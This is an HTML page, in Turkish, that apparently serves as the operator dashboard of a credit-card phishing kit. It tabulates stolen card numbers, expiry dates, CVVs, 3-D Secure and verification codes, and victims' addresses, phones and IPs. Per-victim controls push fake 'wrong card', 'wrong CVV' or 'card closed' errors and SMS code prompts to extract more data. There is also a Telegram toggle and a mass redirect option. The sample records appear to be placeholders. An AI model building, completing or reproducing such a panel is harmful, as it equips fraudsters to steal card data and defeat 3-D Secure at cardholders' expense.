<div class="content-wrapper">
    <div class="container-fluid">
      <!-- Breadcrumb-->
     <div class="row pt-2 pb-2">
        <div class="col-sm-9">
		    <h4 class="page-title">Data Tables</h4>
		    <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">Siparişler</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Kredi Kartı Siparişleri</a></li>
         </ol>
	   </div>
	   <div class="col-sm-3">
       <div class="btn-group float-sm-right">
        <button type="button" class="btn btn-light waves-effect waves-light"><i class="fa fa-cog mr-1"></i> Ayarlar</button>
        <button type="button" class="btn btn-light dropdown-toggle dropdown-toggle-split waves-effect waves-light" data-toggle="dropdown">
        <span class="caret"></span>
        </button>
        <div class="dropdown-menu">
          <a href="javaScript:void();" class="dropdown-item">Tümünü Sil</a>
          <a href="javaScript:void();" class="dropdown-item">Tümünü Banla</a>
          <a href="javaScript:void();" class="dropdown-item">Tümünü Anasayfa'ya Yönlendir</a>
          <div class="dropdown-divider"></div>
          <a href="javaScript:void();" class="dropdown-item">Telegram Aç/Kapa</a>
        </div>
      </div>
     </div>
     </div>

      <div class="row">
        <div class="col-lg-12">
          <div class="card">
            <div class="card-header"><i class="fa fa-table"></i> Kredi Kartları</div>
            <div class="card-body">
              <div class="table-responsive">
              <table id="example" class="table table-bordered">
                <thead>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>1</td>
                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal">Göster</button></td>
                        <td>4543 6047 8787 9898</td>
                        <td>07/25</td>
                        <td>784</td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal">Göster</button></td>
                        <td style="color: green">787887</td>
                        <td style="color: green">545454</td>
                        <td>23/12/2023 12:53:05</td>
                        <td>10500 ₺</td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal">Göster</button></td>
                        <td>
                              <select id="select-area" data-id="1">
                                    <option>Seç</option>
                                    <option value="ban">Banla</option>
                                    <option value="delete">Logu sil</option>
                                    <option value="3dsecure">SMS Gönder</option>
                                    <option value="tebrik">Tebrikle</option>
                                    <option value="hatali">Hatalıya Gönder</option>
                                    <option value="dogrulama">Dogrulama</option>
                                    <option value="ccno_error">CCNO Hatalı</option>
                                    <option value="skt_error">SKT Hatalı</option>
                                    <option value="cvv_error">CVV Hatalı</option>
                                    <option value="bekle">Bekle</option>
                                    <option value="closed_card">Kart Kapalı</option>
                                    <option value="red_card">Hata Ver</option>
                                    <option value="phone_error">Telefon Hatalı</option>
                                </select>
                   
                        </td>
                        <td style="color: green">İşlemi Bitirdi</td>

                    </tr>
                </tbody>
                <tfoot>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </tfoot>
            </table>
            <div class="modal fade" id="smallsizemodal" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                      <div class="modal-header">
                        <h5 class="modal-title">Adres Bilgileri</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">×</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <div class="row">
                            <div class="col-lg-12">
                            <div class="card">
                                <div class="card-body">
                                <h5 class="card-title">Adres Bilgileri</h5>
                                <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                    <tr>
                                        <th scope="col">Ad Soyad</th>
                                        <th scope="col">İl</th>
                                        <th scope="col">İlçe</th>
                                        <th scope="col">Mahalle</th>
                                        <th scope="col">Bina No</th>
                                        <th scope="col">Kat No</th>
                                        <th scope="col">Daire No</th>
                                        <th scope="col">Adres Tarifi</th>
                                        <th scope="col">Adres İsmi</th>
                                        <th scope="col">Telefon</th>
                                        <th scope="col">IP</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td>Ahmet Yılmaz</td>
                                        <td>İstanbul</td>
                                        <td>Beşiktaş</td>
                                        <td>Moda</td>
                                        <td>1</td>
                                        <td>1</td>
                                        <td>1</td>
                                        <td>Yok</td>
                                        <td>Ev</td>
                                        <td>+905324847878</td>
                                        <td>88.252.74.17</td>
                                    </tr>
                                    </tbody>
                                </table>
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-sm" data-dismiss="modal"><i class="fa fa-times"></i> Kapat</button>
                        <button type="button" class="btn btn-primary btn-sm"><i class="fa fa-check-square-o"></i> Güncelle</button>
                      </div>
                    </div>
                  </div>
                </div>
            </div>
            </div>
          </div>
        </div>
      </div><!-- End Row-->
<!--start overlay-->
	  <div class="overlay toggle-menu"></div>
	<!--end overlay-->
    </div>
    <!-- End container-fluid-->
    
    </div>